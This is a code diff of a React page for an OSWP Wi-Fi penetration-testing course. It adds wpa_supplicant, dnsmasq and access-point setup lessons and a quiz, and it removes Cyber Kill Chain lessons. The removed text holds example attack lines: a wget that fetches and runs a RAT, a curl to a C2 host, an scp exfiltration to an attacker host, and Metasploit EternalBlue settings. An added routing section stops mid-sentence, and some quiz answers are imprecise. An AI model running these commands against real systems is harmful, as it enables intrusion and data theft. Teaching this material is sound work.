@@ -14,78 +14,60 @@ function OSWPCourse() {
         {
           title: "Introduction to OSWP Road Map",
           summary: (
-            <>
-              <p><strong>Introduction to OSWP Road Map</strong></p><br></br>
+            <div style={{ textAlign: 'center' }}>
+              <p><strong>Introduction to OSWP Road Map</strong></p><br />
               <p>
-              Wireless networks are an essential part of modern communication, but they also introduce significant security risks. The Offensive Security Wireless Professional (OSWP) certification is designed to equip cybersecurity professionals with the skills to assess and exploit vulnerabilities in Wi-Fi networks.
+                Wireless networks are an essential part of modern communication, but they also introduce significant security risks. The Offensive Security Wireless Professional (OSWP) certification is designed to equip cybersecurity professionals with the skills to assess and exploit vulnerabilities in Wi-Fi networks.
               </p> 
               <p>
-                <strong>Who Is This Course For? </strong><br></br>
+                <strong>Who Is This Course For? </strong><br />
               </p>
               <ul>
                 <li>
-                  <strong>This course is ideal for:</strong> 
+                  <strong>This course is ideal for:</strong>
                 </li>
-                <li>
-                ✅ IT professionals responsible for securing Wi-Fi networks.
-                </li>
-                <li>
-                ✅ Penetration testers looking to expand their skill set.
-                </li>
-                <li>
-                ✅ Cybersecurity professionals wanting to specialize in wireless security.
-
-                </li>
-                <li>
-                ✅ Ethical hackers seeking OSWP certification.
-
-                </li>
+                <li>✅ IT professionals responsible for securing Wi-Fi networks.</li>
+                <li>✅ Penetration testers looking to expand their skill set.</li>
+                <li>✅ Cybersecurity professionals wanting to specialize in wireless security.</li>
+                <li>✅ Ethical hackers seeking OSWP certification.</li>
               </ul>
-              
+        
               <p>
-                <strong>What You’ll Learn? </strong><br></br>
+                <strong>What You’ll Learn? </strong><br />
               </p>
               <p>
-              In this course, we will cover the fundamentals of Wi-Fi security, the methodologies used by attackers, and the defensive strategies to secure wireless networks. By the end, you'll have hands-on experience with real-world Wi-Fi attacks and be fully prepared for the OSWP exam.
+                In this course, we will cover the fundamentals of Wi-Fi security, the methodologies used by attackers, and the defensive strategies to secure wireless networks. By the end, you'll have hands-on experience with real-world Wi-Fi attacks and be fully prepared for the OSWP exam.
               </p>
-
+        
               <p>
-              <strong> Course Structure:  </strong><br></br>
+                <strong> Course Structure: </strong><br />
               </p>
               <p>
-              This course follows a practical, hands-on approach, covering:
+                This course follows a practical, hands-on approach, covering:
               </p>
               <ul>
-              <li> 1️⃣ Wireless Network Basics – 802.11 standards, encryption protocols, and wireless reconnaissance.</li>
-              <li>2️⃣ Packet Capture & Analysis – Using tools like Airodump-ng and Wireshark.</li>
-              <li>3️⃣ Wi-Fi Exploitation Techniques – Cracking WEP, WPA/WPA2, and PMKID attacks.</li>
-              <li>4️⃣ Rogue Access Points & Evil Twin Attacks – Setting up fake APs for credential theft.</li>
-              <li>5️⃣ Post-Exploitation & Defense Strategies – How to protect against common wireless threats.</li>
+                <li>1️⃣ Wireless Network Basics – 802.11 standards, encryption protocols, and wireless reconnaissance.</li>
+                <li>2️⃣ Packet Capture & Analysis – Using tools like Airodump-ng and Wireshark.</li>
+                <li>3️⃣ Wi-Fi Exploitation Techniques – Cracking WEP, WPA/WPA2, and PMKID attacks.</li>
+                <li>4️⃣ Rogue Access Points & Evil Twin Attacks – Setting up fake APs for credential theft.</li>
+                <li>5️⃣ Post-Exploitation & Defense Strategies – How to protect against common wireless threats.</li>
               </ul>
-
+        
               <p>
-              <strong> What You Need Before Starting? </strong><br></br>
+                <strong>What You Need Before Starting? </strong><br />
               </p>
-              
-              <p>
-
+        
               <ul>
-              <li>📌 Basic Linux knowledge (Kali Linux is recommended).</li>
-              <li>📌 Understanding of networking concepts (IP addresses, DHCP, etc.).</li>
-              <li>📌 A wireless network adapter that supports packet injection (e.g., ALFA AWUS036NHA).</li>
-             
+                <li>📌 Basic Linux knowledge (Kali Linux is recommended).</li>
+                <li>📌 Understanding of networking concepts (IP addresses, DHCP, etc.).</li>
+                <li>📌 A wireless network adapter that supports packet injection (e.g., ALFA AWUS036NHA).</li>
               </ul>
-             
-
+        
               By the end of this course, you will have a deep understanding of wireless security, be able to perform real-world Wi-Fi penetration tests, and be well-prepared for the OSWP exam.
-
-
-              <br></br><br></br>
-            👉 Let’s dive in and start hacking Wi-Fi! 🚀
-
-              </p>
-           
-            </>
+        
+              <br /><br />
+              👉 Let’s dive in and start hacking Wi-Fi! 🚀
+            </div>
           )
         },
         {
@@ -190,71 +172,295 @@ function OSWPCourse() {
         {
           title: "Manual Network Connections",
           summary: (
-            <>
+            <div style={{ textAlign: 'center' }}>
+              <p><strong>Overview of Wireless Penetration Testing</strong></p>
               <p>
-                The daily routine of a SOC analyst is dynamic, demanding constant vigilance and rapid response to evolving threats. While each day may present unique challenges, a typical day involves a combination of monitoring, investigation, collaboration, and continuous learning.
+                Wireless penetration testing tools usually require disabling network managers because they interfere with the proper operation of the tools.
+              </p>
+              <br /><br />
+              <p><strong>Connecting to an Access Point</strong></p>
+              <p>
+                Several wireless clients exist on Linux. The most common one is wpa_supplicant, as it is commonly used by network managers across Linux distributions to connect to Wi-Fi networks, even if they don't have any encryption or still use WEP.
               </p>
               <p>
-                <strong>Morning Briefing and Handoff:</strong>
+                wpa_supplicant can either be used via a command line interface, with wpa_cli, or with configuration files containing the settings of the network. In a sample configuration file, each network connection is defined within a network item.
+              </p>
+              <pre>
+                network={{
+                  ssid="hotel_wifi"
+                  scan_ssid=1
+                }}
+              </pre>
+              <p>
+                The above example allows the system to connect to an open network, called "hotel_wifi" as indicated in the second line, and wpa_supplicant is instructed to scan for SSIDs first.
+              </p>
+              <br />
+              <p>
+                Connecting to a WPA-PSK network is a bit more involved. We need to add two parameters inside the network item:
+              </p>
+              <pre>
+                network={{
+                  ssid="home_network"
+                  scan_ssid=1
+                  psk="correct battery horse staple"
+                  key_mgmt=WPA-PSK
+                }}
+              </pre>
+              <p>
+                wpa_supplicant will automatically choose between TKIP and CCMP based on availability, but it is possible to force one or the other by adding pairwise=CCMP or pairwise=TKIP to the configuration if necessary.
               </p>
               <p>
-                The day begins with a morning briefing, where the outgoing shift provides a detailed handoff covering overnight incidents, active alerts, and ongoing investigations. This briefing ensures that every team member is aware of the current threat landscape and priorities.
+                wpa_supplicant supports WPA3, OWE, and can handle WPA Enterprise networks as well; however, these are out of scope of this module. The configuration file provided with the wpa_supplicant source code provides a number of examples for various network settings, including WPA3, OWE, and WPA Enterprise.
               </p>
               <p>
-                <strong>Start-of-Shift Activities:</strong>
-              </p>
-              <ul>
-                <li>Log into the SIEM dashboard to review current alerts and system statuses.</li>
-                <li>Check emails and incident reports for escalations or updates.</li>
-                <li>Verify that all monitoring systems (firewalls, IDS/IPS, endpoint tools) are functioning correctly.</li>
-              </ul>
-              <p>
-                <strong>Midday: Triage, Analysis, and Investigation</strong>
+                A quick and easy alternative is wpa_passphrase. This tool can generate a configuration file for a basic WPA-PSK network. It requires at least one parameter, the ESSID. The second parameter, the passphrase, is optional, for security reasons. If the second parameter is omitted, it will prompt for the passphrase. This tool will output the content of a configuration file. We can redirect the output to a file with 'wpa_passphrase home_network > home_network.conf'
               </p>
               <p>
-                As the day progresses, SOC analysts actively monitor alerts. A high-priority alert—such as unusual outbound traffic—may trigger a detailed investigation. Analysts will analyze log data, use tools like Wireshark for packet captures, and run Splunk queries such as:
+                Using the example in the above text, we'll create a file called wifi-client.conf. We now have to start wpa_supplicant with a couple of parameters. To connect to the network, we have to start wpa_supplicant with the network interface using -i, and the configuration file with -c. Assuming the interface is wlan0, the command and the output will look like the following.
               </p>
-              <pre>{`# Example Splunk query to identify high traffic volumes
-  index=network sourcetype=netflow 
-  | stats sum(bytes) as total_bytes by src_ip, dest_ip 
-  | where total_bytes > 100000000`}</pre>
+              <pre>
+                kali@kali:~$ sudo wpa_supplicant -i wlan0 -c wifi-client.conf
+                Successfully initialized wpa_supplicant
+                wlan0: SME: Trying to authenticate with 00:ef:78:be:0d:98 (SSID='home_network' freq=2437 MHz)
+                wlan0: Trying to associate with 00:ef:78:be:0d:98 (SSID='home_network' freq=2437 MHz)
+                wlan0: Associated with 00:ef:78:be:0d:98
+                wlan0: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
+                wlan0: WPA: Key negotiation completed with 00:ef:78:be:0d:98 [PTK=CCMP GTK=CCMP]
+                wlan0: CTRL-EVENT-CONNECTED - Connection to 00:ef:78:be:0d:98 completed [id=0 id_str=]
+
+              </pre>
+
               <p>
-                This query helps pinpoint potential data exfiltration or DDoS attacks. Collaborative efforts with incident response teams help determine if the incident is part of a broader attack.
+              Now that we've confirmed we can successfully connect to the network, we can append -B to our wpa_supplicant command line to run it in the background. Once connected, we usually request a DHCP lease using dhclient:
+
               </p>
+
+              <pre>
+              kali@kali:~$ sudo dhclient wlan0
+              </pre>
+              <p><strong>Setting up an Access Point</strong></p>
+
+              <p>Setting up an access point requires two distinct network interfaces, and involves five steps:              
+
+                <ul>
+                <li>- Configure Internet access on the system.                </li>
+                <li>- Set up a static IP for the wireless interface.                </li>
+                <li>- DHCP server set up, to provide automatic IP configuration for Wi-Fi clients.                </li>
+                <li>- Add routing to provide Internet access to the Wi-Fi clients.                </li>
+                <li>- Configure the Wi-Fi interface in AP mode.                </li>
+                </ul>
+              </p>
+
+              <p><strong>Internet Access</strong></p>
+
               <p>
-                <strong>Afternoon: Collaboration and Documentation</strong>
+              We first need to have Internet access on the system. It doesn't really matter if it is via Ethernet, Wi-Fi, or if it's mobile broadband.
+              Ethernet is fairly easy to set up, and in most cases, we just need to get a DHCP lease like we did in the previous steps.
+              If the connection is Wi-Fi, we can refer to the section above to configure it. It is important to note that while it is possible to do client and AP on a single Wi-Fi interface, configuration is a bit more involved, has limitations, and may not work properly (the Wi-Fi adapters recommended for this course provide this ability). Therefore, we must be careful choosing the interface to use for the access point, as not all Wi-Fi adapters support that mode. We can use iw to display what modes each of the wireless interface support.
               </p>
-              <p>
-                Throughout the day, analysts communicate with team members, participate in briefings, and update incident documentation. Detailed incident reports are created for every confirmed threat, capturing the timeline, actions taken, and lessons learned.
-              </p>
-              <p>
-                <strong>End-of-Shift and Handoff:</strong>
-              </p>
-              <p>
-                As the shift nears its end, analysts compile a comprehensive handoff report summarizing incidents, investigations, and actions taken during the day. This ensures a smooth transition to the incoming team and continuity in threat monitoring.
-              </p>
-              <p>
-                <strong>Real-World Example:</strong> In one day, an analyst might handle a phishing campaign alert, investigate lateral movement within the network, and document a potential data exfiltration incident. Their findings and actions are then shared with the next shift to maintain situational awareness.
-              </p>
-              <p>
-                A day in the life of a SOC analyst is both challenging and rewarding. Continuous learning, team collaboration, and adapting to new threats are essential components of a successful SOC operation.
-              </p>
-            </>
+              <pre>kali@kali:~$ sudo iw list              </pre>
+
+                <p>
+                Supported interface modes:
+                  <ul>
+                    <li>IBSS</li>
+                    <li>managed</li>
+                    <li>AP</li>
+                    <li>AP/VLAN</li>
+                    <li>monitor</li>
+                    <li>mesh point</li>
+                    <li>2P-client</li>
+                    <li>P2P-GO</li>
+                    <li>outside context of a BSS</li>
+                  </ul>
+                </p>
+
+                <p><strong>Static IP on Access Point Wireless Interface</strong></p>
+                <p>We now have to choose an IP address that doesn't conflict with the network and CIDR of the interface we just configured for Internet. Most routers offer an IP in the 192.168.1.0/24 range, so we will use the 10.0.0.0/24 range and set the wireless interface for the access point to 10.0.0.1. We'll assume the interface is wlan0.
+                </p> 
+                <pre>kali@kali:~$ sudo ip link set wlan0 up                </pre>
+                <pre>kali@kali:~$ sudo ip addr add 10.0.0.1/24 dev wlan0                </pre>
+
+                <p><strong>DHCP Server</strong></p>
+                <p>We will set up the DHCP server on the wireless interface (wlan0) using dnsmasq, which is a DNS and DHCP server. We'll create the following configuration file and save it as dnsmasq.conf.
+                </p>
+
+                <p>
+                Main options
+                <ul>
+                  <li>domain-needed</li>
+                  <li>bogus-priv</li>
+                  <li>no-resolv</li>
+                  <li>filterwin2k</li>
+                  <li>expand-hosts</li>
+                  <li>domain=localdomain</li>
+                  <li>local=/localdomain/</li>
+                  <br></br>
+                  Only listen on this address. When specifying an interface, it also listens on localhost. We don't want to interrupt any local resolution listen-address=10.0.0.1
+                </ul>
+                </p>
+
+                <p>
+                DHCP range
+                <ul>
+                  <li>dhcp-range=10.0.0.100,10.0.0.199,12h</li>
+                  <li>dhcp-lease-max=100</li>
+                  <li>Router: wlan0</li>
+                  <li>dhcp-option=option:router,10.0.0.1</li>
+                  <li>dhcp-authoritative</li>
+                </ul>
+                </p>
+
+                <p>
+                DNS: Primary and secondary Google DNS
+                <ul>
+                  <li>server=8.8.8.8</li>
+                  <li>server=8.8.4.4</li>
+                </ul>
+                </p>
+
+                <p>
+                Now that our dnsmasq configuration is complete, we will run dnsmasq with --conf-file followed by the path of our configuration file.
+                <ul>
+                  <li>kali@kali:~$ sudo dnsmasq --conf-file=dnsmasq.conf </li>
+                </ul>
+                </p>
+                
+                <p>
+                After startup, dnsmasq will create a file containing its process ID in /var/run/dnsmasq.pid, which lets us find and kill the process when we are done. We will inspect syslog to confirm it started successfully.
+
+                <pre>
+                  <ul>
+                    <li>kali@kali:~$ sudo tail /var/log/syslog | grep dnsmasq</li>
+                    <li>Nov 10 19:36:39 kali dnsmasq[158592]: started, version 2.82 cachesize 150</li>
+                    <li>Nov 10 19:36:39 kali dnsmasq[158592]: compile time options: IPv6 GNU-getopt DBus no-UBus i18n IDN2 DHCP DHCPv6 no-Lua TFTP conntrack ipset auth DNSSEC loop-detect inotify dumpfile
+                    </li>
+                    <li>Nov 10 19:36:39 kali dnsmasq-dhcp[158592]: DHCP, IP range 10.0.0.100 -- 10.0.0.199, lease time 12h
+                    </li>
+                    <li>Nov 10 19:36:39 kali dnsmasq[158592]: using nameserver 8.8.4.4#53
+                    </li>
+                  </ul>
+                </pre>
+                </p>
+
+                <p>
+                  <strong>Routing</strong>
+                  We now have to enable routing and add a few firewall rules so we can act as a router and allow clients to reach the Internet. We first have to enable IP forwarding, which we can do by setting the ip_forward kernel variable to "1".
+
+<pre>kali@kali:~$ echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
+</pre>
+
+Although this should technically suffice to forward packets over to the Internet, our clients have a different IP address range than the one of our Internet connection. Since the Internet doesn't know where to route that back, packets will get dropped. In order to resolve
+
+
+                </p>
+                
+            </div>
           )
         }
+        
       ],
       quiz: {
         questions: [
           {
-            id: 1,
-            question: "What does SOC stand for?",
-            options: [
-              "Security Operations Center",
-              "System Operations Center",
-              "Security Optimization Center",
-              "System Optimization Center"
+            "id": 1,
+            "question": "What is the primary purpose of wpa_supplicant in Linux?",
+            "options": [
+              "To configure Ethernet interfaces",
+              "To manage wireless network connections",
+              "To monitor network traffic"
             ],
-            correctAnswer: "Security Operations Center"
+            "correctAnswer": "To manage wireless network connections"
+          },
+          {
+            "id": 2,
+            "question": "Which command is used to connect a Linux system to a wireless network with wpa_supplicant?",
+            "options": [
+              "sudo iw list",
+              "sudo wpa_supplicant -i wlan0 -c wifi-client.conf",
+              "sudo ifconfig wlan0 up"
+            ],
+            "correctAnswer": "sudo wpa_supplicant -i wlan0 -c wifi-client.conf"
+          },
+          {
+            "id": 3,
+            "question": "In the wpa_supplicant configuration, what does 'scan_ssid=1' do?",
+            "options": [
+              "It scans only for hidden SSIDs",
+              "It disables network scanning",
+              "It connects to the first available SSID"
+            ],
+            "correctAnswer": "It scans only for hidden SSIDs"
+          },
+          {
+            "id": 4,
+            "question": "Which of the following commands is used to assign an IP address to a wireless network interface in Linux?",
+            "options": [
+              "sudo iwconfig wlan0 ip address 192.168.1.1",
+              "sudo dhclient wlan0",
+              "sudo wpa_supplicant wlan0"
+            ],
+            "correctAnswer": "sudo dhclient wlan0"
+          },
+          {
+            "id": 5,
+            "question": "What is the role of the 'auth_algs' setting in the hostapd.conf file for wireless access points?",
+            "options": [
+              "It sets the encryption type",
+              "It specifies which authentication algorithms are allowed",
+              "It defines the wireless channel width"
+            ],
+            "correctAnswer": "It specifies which authentication algorithms are allowed"
+          },
+          {
+            "id": 6,
+            "question": "What does the 'sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE' command do?",
+            "options": [
+              "It enables firewall rules",
+              "It masquerades outgoing traffic on the eth0 interface",
+              "It blocks traffic from the wlan0 interface"
+            ],
+            "correctAnswer": "It masquerades outgoing traffic on the eth0 interface"
+          },
+          {
+            "id": 7,
+            "question": "What is the purpose of the 'dhcp-range' option in the dnsmasq.conf file?",
+            "options": [
+              "To specify the IP address range for DHCP assignments",
+              "To configure the DNS server IP addresses",
+              "To define the maximum number of clients"
+            ],
+            "correctAnswer": "To specify the IP address range for DHCP assignments"
+          },
+          {
+            "id": 8,
+            "question": "Which wireless mode is used to monitor all wireless traffic on a network in Linux?",
+            "options": [
+              "Managed mode",
+              "Ad-hoc mode",
+              "Monitor mode"
+            ],
+            "correctAnswer": "Monitor mode"
+          },
+          {
+            "id": 9,
+            "question": "In wireless networking, which of the following commands is used to display available Wi-Fi networks in Linux?",
+            "options": [
+              "sudo iwlist wlan0 scan",
+              "sudo wpa_supplicant -i wlan0 -c wifi-client.conf",
+              "sudo ifconfig wlan0"
+            ],
+            "correctAnswer": "sudo iwlist wlan0 scan"
+          },
+          {
+            "id": 10,
+            "question": "Which command is used to bring up a wireless network interface in Linux?",
+            "options": [
+              "sudo iw dev wlan0 set type managed",
+              "sudo ifconfig wlan0 up",
+              "sudo wpa_supplicant -i wlan0 -c wifi-client.conf"
+            ],
+            "correctAnswer": "sudo ifconfig wlan0 up"
           }
         ]
       }
@@ -267,30 +473,7 @@ function OSWPCourse() {
           title: "Introduction",
           summary: (
             <>
-              <p>
-                <strong>Understanding the Cyber Kill Chain</strong>
-              </p>
-              <p>
-                The Cyber Kill Chain is a model developed by Lockheed Martin to describe the stages of a cyber attack. It outlines the step-by-step process that adversaries follow, from initial reconnaissance to achieving their objectives. By understanding each stage, organizations can develop strategies to detect, disrupt, and ultimately defend against advanced persistent threats.
-              </p>
-              <p>
-                The model is widely used in cybersecurity as it provides a structured way to analyze attacks and implement defensive measures. It emphasizes that attackers must successfully complete each stage before achieving their final objective, making it possible to interdict the attack at multiple points along the chain.
-              </p>
-              <p>
-                <strong>Key Benefits of the Cyber Kill Chain:</strong>
-              </p>
-              <ul>
-                <li>Provides a clear, step-by-step framework for understanding cyber attacks.</li>
-                <li>Helps security teams identify and disrupt attacks at various stages.</li>
-                <li>Facilitates communication and collaboration between incident response teams.</li>
-                <li>Drives the development of proactive defense measures and threat intelligence.</li>
-              </ul>
-              <p>
-                <strong>Example:</strong> Consider an attacker planning a data breach. If defenders can disrupt the attack during the reconnaissance or delivery phase, the attacker may never reach the exploitation and installation stages. This layered defense approach is at the heart of the Cyber Kill Chain model.
-              </p>
-              <p>
-                In this course, we will explore each stage of the Cyber Kill Chain in detail, providing practical examples, tools, and strategies to help you understand how to detect and prevent attacks.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -298,36 +481,7 @@ function OSWPCourse() {
           title: "Reconnaissance",
           summary: (
             <>
-              <p>
-                <strong>Gathering Intelligence on the Target</strong>
-              </p>
-              <p>
-                Reconnaissance is the first stage of the Cyber Kill Chain, where attackers collect as much information as possible about their target. This phase is all about gathering intelligence to plan the subsequent stages of the attack.
-              </p>
-              <p>
-                <strong>Techniques Used in Reconnaissance:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Open Source Intelligence (OSINT):</strong> Using publicly available information, such as social media, company websites, and public records, to gather details about the target.
-                </li>
-                <li>
-                  <strong>Network Scanning:</strong> Tools like Nmap are used to identify live hosts, open ports, and services running on the target network.
-                  <br /><code>{`nmap -A target-ip`}</code>
-                </li>
-                <li>
-                  <strong>Web Footprinting:</strong> Analyzing a target’s online presence to gather domain information, server details, and potential vulnerabilities.
-                </li>
-                <li>
-                  <strong>Social Engineering:</strong> Researching employee profiles on social media or professional networks to identify potential entry points.
-                </li>
-              </ul>
-              <p>
-                <strong>Example Scenario:</strong> An attacker uses a tool like Shodan to search for publicly accessible devices with default credentials. Combined with OSINT techniques, the attacker builds a profile of the target’s network infrastructure and personnel.
-              </p>
-              <p>
-                Effective reconnaissance not only helps the attacker refine their strategy but also provides defenders with the opportunity to identify exposed assets and tighten security measures.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -335,34 +489,7 @@ function OSWPCourse() {
           title: "Weaponization",
           summary: (
             <>
-              <p>
-                <strong>Crafting the Attack Payload</strong>
-              </p>
-              <p>
-                Weaponization is the stage where the attacker prepares the malicious payload by coupling it with an exploit. This phase involves taking the information gathered during reconnaissance and using it to develop a weapon that can breach the target’s defenses.
-              </p>
-              <p>
-                <strong>Key Processes in Weaponization:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Exploit Development:</strong> Creating or selecting an exploit that takes advantage of a known vulnerability in the target system.
-                </li>
-                <li>
-                  <strong>Payload Creation:</strong> Generating the malicious code (e.g., malware, ransomware, backdoor) that will be executed on the target system.
-                </li>
-                <li>
-                  <strong>Coupling Exploit and Payload:</strong> Tools like Metasploit allow attackers to combine exploits with payloads. For example:
-                  <br /><code>{`use exploit/windows/smb/ms17_010_eternalblue`}</code>
-                  <br /><code>{`set PAYLOAD windows/x64/meterpreter/reverse_tcp`}</code>
-                </li>
-              </ul>
-              <p>
-                <strong>Example:</strong> An attacker might weaponize a phishing email by embedding a malicious document that exploits a zero-day vulnerability in a popular PDF reader. When the target opens the document, the payload executes and establishes a foothold in the system.
-              </p>
-              <p>
-                The success of this stage depends on the attacker’s ability to accurately match the payload with the discovered vulnerabilities and bypass security controls.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -370,35 +497,7 @@ function OSWPCourse() {
           title: "Delivery",
           summary: (
             <>
-              <p>
-                <strong>Transmitting the Malicious Payload</strong>
-              </p>
-              <p>
-                Delivery is the phase in which the weaponized payload is transmitted to the target. The attacker chooses a delivery method based on the target's vulnerabilities and the information gathered during reconnaissance.
-              </p>
-              <p>
-                <strong>Common Delivery Methods:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Phishing Emails:</strong> Crafting emails that appear legitimate to lure targets into opening malicious attachments or clicking on harmful links.
-                </li>
-                <li>
-                  <strong>Drive-by Downloads:</strong> Hosting malicious code on compromised or malicious websites that automatically download malware when visited.
-                </li>
-                <li>
-                  <strong>Removable Media:</strong> Using USB drives or other physical media to deliver malware. For example, leaving a USB drive labeled “Confidential” in a public area.
-                </li>
-                <li>
-                  <strong>Exploiting Web Applications:</strong> Injecting malicious code into vulnerable websites or exploiting insecure file upload functionalities.
-                </li>
-              </ul>
-              <p>
-                <strong>Example:</strong> A spear phishing email might be sent to a company’s finance department with a subject like “Urgent Invoice Update.” The email includes a malicious attachment that, once opened, triggers the execution of the payload.
-              </p>
-              <p>
-                The delivery method is crucial because it must bypass security filters, avoid detection, and successfully reach the target system.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -406,35 +505,7 @@ function OSWPCourse() {
           title: "Exploitation",
           summary: (
             <>
-              <p>
-                <strong>Triggering the Malicious Code</strong>
-              </p>
-              <p>
-                Exploitation is the phase where the payload, once delivered, takes advantage of a vulnerability to execute on the target system. This stage is where the actual breach occurs, and unauthorized access is gained.
-              </p>
-              <p>
-                <strong>Exploitation Techniques:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Buffer Overflows:</strong> Exploiting a software bug where more data is written to a buffer than it can hold, allowing the attacker to execute arbitrary code.
-                </li>
-                <li>
-                  <strong>Code Injection:</strong> Injecting malicious code into an application through unsanitized input fields.
-                </li>
-                <li>
-                  <strong>Privilege Escalation:</strong> Exploiting vulnerabilities to gain higher-level privileges on a system.
-                </li>
-                <li>
-                  <strong>Zero-Day Exploits:</strong> Taking advantage of vulnerabilities that are unknown to the vendor, leaving no patch available.
-                </li>
-              </ul>
-              <p>
-                <strong>Example:</strong> A common scenario is when an attacker sends a phishing email with a malicious attachment. When the target opens the file, an exploit is triggered that takes advantage of an unpatched vulnerability in the document viewer, thereby granting the attacker remote access.
-              </p>
-              <p>
-                Exploitation requires a precise match between the payload and the vulnerability. The more specific the exploit, the harder it is to defend against.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -442,41 +513,7 @@ function OSWPCourse() {
           title: "Installation",
           summary: (
             <>
-              <p>
-                <strong>Establishing Persistence on the Target System</strong>
-              </p>
-              <p>
-                After successful exploitation, the attacker aims to install malware or backdoors to maintain persistent access to the compromised system. The installation phase ensures that the attacker can return even if the initial vulnerability is patched.
-              </p>
-              <p>
-                <strong>Key Installation Techniques:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Droppers and Downloaders:</strong> Tools that download and install additional malware components onto the target.
-                </li>
-                <li>
-                  <strong>Rootkits:</strong> Software designed to hide the presence of malicious code and provide continued access.
-                </li>
-                <li>
-                  <strong>Persistence Mechanisms:</strong> Modifying registry keys, scheduled tasks, or startup scripts to ensure that malware runs each time the system boots.
-                </li>
-              </ul>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  A droplet might execute a script that downloads a remote access tool (RAT) from an attacker-controlled server:
-                  <br /><code>{`wget http://malicious.example.com/rat.exe -O rat.exe && rat.exe`}</code>
-                </li>
-                <li>
-                  A rootkit might modify system files to remain hidden from antivirus software.
-                </li>
-              </ul>
-              <p>
-                The installation phase is critical because it sets up the attacker’s foothold and enables long-term control over the compromised system.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -484,41 +521,7 @@ function OSWPCourse() {
           title: "Command & Control",
           summary: (
             <>
-              <p>
-                <strong>Establishing Communication with the Attacker</strong>
-              </p>
-              <p>
-                The Command & Control (C2) stage is where the attacker establishes a communication channel with the compromised system. This channel is used to send commands, update payloads, and exfiltrate data.
-              </p>
-              <p>
-                <strong>Key Components of C2 Infrastructure:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>C2 Servers:</strong> The remote servers controlled by the attacker, which issue commands and receive data from the compromised host.
-                </li>
-                <li>
-                  <strong>Communication Protocols:</strong> Commonly used protocols include HTTP/HTTPS, DNS tunneling, and custom protocols that can bypass firewalls.
-                </li>
-                <li>
-                  <strong>Stealth Techniques:</strong> Methods like domain fluxing, fast-flux DNS, and encrypted channels are used to evade detection.
-                </li>
-              </ul>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  A compromised system might initiate a connection to a C2 server using HTTPS:
-                  <br /><code>{`curl -X POST https://c2.example.com/command -d "id=1234&cmd=update"`}</code>
-                </li>
-                <li>
-                  Attackers may use tools like Cobalt Strike to establish and manage C2 channels.
-                </li>
-              </ul>
-              <p>
-                Maintaining a robust C2 channel allows attackers to control the compromised system remotely, issue commands for further actions, and exfiltrate valuable data, making this stage a critical component of advanced persistent threats.
-              </p>
+              <p></p>
             </>
           )
         },
@@ -526,52 +529,11 @@ function OSWPCourse() {
           title: "Actions on Objectives (Exfiltration)",
           summary: (
             <>
-              <p>
-                <strong>Achieving the Attacker's Goals</strong>
-              </p>
-              <p>
-                The final stage of the Cyber Kill Chain is where the attacker achieves their objectives. These objectives may include data exfiltration, data destruction, system disruption, or espionage. Once the attacker has established persistence and communication, they begin to extract valuable data or execute destructive actions.
-              </p>
-              <p>
-                <strong>Common Objectives:</strong>
-              </p>
-              <ul>
-                <li>
-                  <strong>Data Exfiltration:</strong> Stealing sensitive data such as intellectual property, financial records, or personal information. This can be done using encrypted channels or covert transfer protocols.
-                </li>
-                <li>
-                  <strong>Data Destruction:</strong> Deleting or corrupting data to disrupt business operations or cover tracks.
-                </li>
-                <li>
-                  <strong>Credential Harvesting:</strong> Extracting user credentials and other authentication tokens to enable further access.
-                </li>
-                <li>
-                  <strong>System Disruption:</strong> Launching ransomware attacks or other forms of cyber sabotage.
-                </li>
-              </ul>
-              <p>
-                <strong>Examples:</strong>
-              </p>
-              <ul>
-                <li>
-                  An attacker exfiltrates data using a command like:
-                  <br /><code>{`tar -czf /tmp/data.tar.gz /sensitive_data && scp /tmp/data.tar.gz attacker@malicious.example.com:/exfil`}</code>
-                </li>
-                <li>
-                  Another scenario involves deploying ransomware that encrypts files and demands payment for decryption.
-                </li>
-              </ul>
-              <p>
-                By understanding the final objectives of an attack, defenders can implement measures to detect unusual data transfers, monitor network traffic for signs of exfiltration, and employ data loss prevention (DLP) solutions to stop sensitive data from leaving the organization.
-              </p>
-              <p>
-                In summary, the Actions on Objectives stage is where the attacker reaps the rewards of their efforts. Effective monitoring and prevention mechanisms at this stage can help organizations mitigate the impact of successful breaches.
-              </p>
+              <p></p>
             </>
           )
         }
-      ],
-      quiz: {
+      ], quiz: {
         questions: [
           {
             id: 1,
@@ -595,31 +557,7 @@ function OSWPCourse() {
           title: "What is the MITRE ATT&CK framework",
           summary: (
             <>
-              <p>
-                <strong>Overview</strong>
-              </p>
-              <p>
-                The MITRE ATT&CK framework is a globally-accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. Developed by MITRE, it provides a comprehensive and structured taxonomy that describes the various stages of a cyber attack. This framework is used by security professionals to better understand how adversaries operate, to assess security posture, and to improve detection and response strategies.
-              </p>
-              <p>
-                <strong>Key Components:</strong> The framework is divided into tactics (the “why” of an attack), techniques (the “how”), and procedures (detailed implementation methods). It spans various attack surfaces and includes a wealth of historical data and examples that can be used for threat hunting, incident response, and red teaming.
-              </p>
-              <p>
-                <strong>Real-World Example:</strong> For instance, if an organization is experiencing unusual lateral movement in their network, an analyst can reference the MITRE ATT&CK framework to determine which techniques (such as "Pass the Hash" or "Remote File Copy") are commonly used for lateral movement. This contextual information can then guide the investigation and the deployment of specific countermeasures.
-              </p>
-              <p>
-                Additionally, organizations use the framework to map their existing security controls against known adversary behaviors and identify gaps in their defenses.
-              </p>
-              <p>
-                <strong>Code Snippet Example:</strong> In a SIEM system, you might tag events with MITRE ATT&CK IDs to correlate alerts:
-              </p>
-              <pre>{`# Pseudo-code example for tagging logs
